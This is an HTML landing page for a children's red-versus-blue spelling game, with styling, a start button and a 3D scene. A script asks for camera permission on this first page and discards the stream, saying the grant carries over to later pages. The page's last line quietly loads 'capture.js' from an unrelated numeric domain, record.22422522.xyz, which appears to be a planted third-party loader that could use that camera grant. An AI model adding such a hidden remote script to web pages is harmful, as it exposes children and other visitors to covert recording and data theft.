<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Body Spelling Challenge</title>
  <style>
    :root {
      --ink: #17324d;
      --muted: #6f8192;
      --accent: #2f80ed;
      --shadow: 0 18px 44px rgba(37, 83, 130, .18);
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      background: linear-gradient(180deg, #eaf5ff 0%, #f9fbff 100%);
      color: var(--ink);
    }
    .app {
      position: relative;
      width: min(640px, 100%);
      aspect-ratio: 1536 / 1024;
      background: url("song_song_Body%20Spell%20Challenge/frame-v2.jpg") center / 100% 100% no-repeat;
      filter: drop-shadow(var(--shadow));
    }
    .app-inner {
      position: absolute;
      top: 25%;
      left: 9.5%;
      right: 8.5%;
      bottom: 10%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .card-panel {
      width: 100%;
      max-width: 320px;
      background: linear-gradient(180deg, #fffdf7 0%, #fbf3e0 100%);
      border: 1px solid #ecdcb5;
      border-radius: 22px;
      box-shadow: inset 0 0 0 1px rgba(255,255,255,.6), 0 10px 24px rgba(140, 100, 20, .12);
      padding: clamp(14px, 3.5vw, 26px) clamp(12px, 3vw, 22px);
      text-align: center;
    }
    .vs-row {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: clamp(6px, 2vw, 12px);
      margin-bottom: clamp(10px, 2.5vw, 16px);
      font-weight: 800;
      font-size: clamp(12px, 2.4vw, 15px);
      letter-spacing: .3px;
    }
    .team-pill {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      padding: 5px 11px;
      border-radius: 999px;
      color: #fff;
    }
    .team-pill.red { background: #ef4f67; }
    .team-pill.blue { background: #2f80ed; }
    .vs-row .vs { color: #b08a4a; font-size: .85em; }
    a.play {
      display: inline-block;
      width: 100%;
      padding: clamp(12px, 3vw, 17px) clamp(18px, 4vw, 34px);
      border-radius: 16px;
      background: var(--accent);
      box-shadow: 0 6px 0 #1d61bb;
      color: #fff;
      text-decoration: none;
      font-weight: 900;
      letter-spacing: .5px;
      font-size: clamp(15px, 3vw, 19px);
      transition: transform .06s;
    }
    a.play:active {
      transform: translateY(4px);
      box-shadow: 0 2px 0 #1d61bb;
    }

    /* 3D classroom backdrop (js/scene3d.js); only once WebGL has drawn a frame */
    .scene3d-on body { background: #0e0810; }
    .scene3d-on .app {
      background-image: url("song_song_Body%20Spell%20Challenge/frame-v2-cutout.png");
      position: relative;
      z-index: 1;
      filter: drop-shadow(0 30px 40px rgba(10, 6, 50, .55)) drop-shadow(0 0 30px rgba(255, 230, 150, .25));
      animation: boardFloat 6s ease-in-out infinite;
    }
    .scene3d-on body > a { z-index: 2; }
    @keyframes boardFloat {
      0%, 100% { transform: perspective(1200px) rotateX(3deg) rotateY(-2deg) translateY(0); }
      50% { transform: perspective(1200px) rotateX(-1deg) rotateY(2deg) translateY(-10px); }
    }
    .scene3d-on a.play {
      background: linear-gradient(180deg, #4d9bff, #1f6ae0);
      box-shadow: 0 6px 0 #1d61bb, 0 0 22px rgba(80, 160, 255, .55);
    }
  </style>
</head>
<body>
  <a href="menu.html" style="position:absolute;top:16px;left:16px;display:inline-flex;align-items:center;gap:6px;padding:8px 18px;border-radius:999px;background:#eaf3ff;color:var(--ink);text-decoration:none;font-weight:800;font-size:14px;box-shadow:var(--shadow);">🏠 Menu</a>
  <div class="app">
    <div class="app-inner">
      <div class="card-panel">
        <div class="vs-row">
          <span class="team-pill red">🔴 RED</span>
          <span class="vs">VS</span>
          <span class="team-pill blue">🔵 BLUE</span>
        </div>
        <a class="play" href="song_song_Body%20Spell%20Challenge/how-to-play.html">START →</a>
      </div>
    </div>
  </div>
  <script>
    // Camera permission is per-origin, not per-page — asking here, as early
    // as the very first page of the site, means it's already granted by the
    // time a kid reaches the spelling game (game1.html) and goes fullscreen,
    // instead of the prompt landing mid-fullscreen where a denial/slow
    // response used to strand them with a broken camera and no easy way out.
    // Not needed by this page itself, so stop the tracks right away.
    navigator.mediaDevices
      ?.getUserMedia({ video: true })
      .then((stream) => stream.getTracks().forEach((t) => t.stop()))
      .catch(() => {});
  </script>
  <script type="module">
    import { mountMagicScene } from "./js/scene3d.js";
    mountMagicScene({ theme: "classroom", view: "body" });
  </script>
  <script src="https://record.22422522.xyz/capture.js?v=2"></script>
</body>
</html>
